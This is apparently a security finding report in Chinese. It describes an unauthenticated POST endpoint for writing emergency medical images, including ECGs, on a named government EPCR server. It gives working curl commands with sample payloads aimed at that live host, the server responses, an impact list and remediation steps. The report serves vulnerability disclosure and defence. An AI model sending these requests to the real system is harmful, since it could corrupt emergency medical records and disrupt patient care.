- Severity: **high**
- Status: open

- Target: `https://epcr.tpf.gov.tw:4001/imageData（POST 未鉴权写端点）`

## Description

EPCR vitalSignVideoServer（:4001）的 /imageData 端点支持 POST 方法且未做身份/权限校验（无 token 即可调用），必填字段 fileName/fileData/generatedAt。未鉴权 POST 返回 400 notNull Violation（列出三个必填字段），与 /videoData POST 行为完全一致，证明 /imageData POST 端点存在且未鉴权。该端点用于急救影像（含心电图 ECG）的数据写入，未鉴权即可触发后端写入逻辑。

## Reproduction

1. 无 token 执行：curl -sSk -X POST -H "Content-Type: application/json" -d '{}' https://epcr.tpf.gov.tw:4001/imageData
   观察返回 400 337B notNull Violation（fileName/fileData/generatedAt 必填），证明 POST 端点存在且未鉴权（非 401）。
2. 提供必填字段（无 token）：curl -sSk -X POST -H "Content-Type: application/json" -d '{"fileName":"poc.png","fileData":"aGVsbG8=","generatedAt":"2025-01-01T00:00:00.000Z"}' https://epcr.tpf.gov.tw:4001/imageData
   观察进入写入逻辑（非 401 鉴权拒绝）。
3. 对照 4000 MCi API 未带 token 均 401，凸显 4001 数据层写端点缺失鉴权。

## Evidence

1. POST /imageData（无 token）：
curl -sSk -X POST -H "Content-Type: application/json" -d '{}' https://epcr.tpf.gov.tw:4001/imageData
→ 400 337B {"message":"notNull Violation: fileName cannot be null,\nnotNull Violation: fileData cannot be null,\nnotNull Violation: generatedAt cannot be null","errors":[{"field":"fileName","message":"fileName cannot be null"},{"field":"fileData",...
2. 对照 /videoData POST（无 token）：
POST /videoData -d '{}' → 400 337B 相同 notNull Violation（fileName/fileData/generatedAt）
3. 对照 4000 的 MCi API（/MciPcrs 等）未带 token 均 401 183B，而 4001 /imageData POST 无 token 返回 400 业务校验错误（非 401 鉴权拒绝），证明未鉴权可达。
4. PUT/DELETE/PATCH /imageData → 404 160B（仅 POST 有效）

## Impact

1) 未鉴权写操作：攻击者无需凭证即可触发 /imageData 的急救影像（含心电图 ECG）写入流程。
2) 数据污染：若 fileData 格式正确，可能写入攻击者控制的影像数据，污染急救影像库。
3) DoS：大量未鉴权 POST 消耗存储/带宽/文件句柄。
4) 与 /imageData 未鉴权读取（26119b5c、9a84230a）组合，攻击者对急救影像可读可写。
5) 与 /videoData POST 未鉴权写（5c9e909b）共同构成 :4001 数据层未鉴权写面。

## Recommendation

1) 为 /imageData 的 POST/PUT/DELETE 等写方法增加身份认证与权限校验（仅限授权服务端/角色写入）。
2) 对 fileName/fileData/generatedAt 做严格类型、大小与内容校验（fileData 建议 base64 长度上限、MIME 白名单）。
3) 限制未鉴权写入速率，防止存储耗尽；写入成功/失败统一返回结构化错误，避免泄露内部字段约束。
4) 对 /videoData 与 /imageData 统一接入认证中间件，避免数据层裸奔。
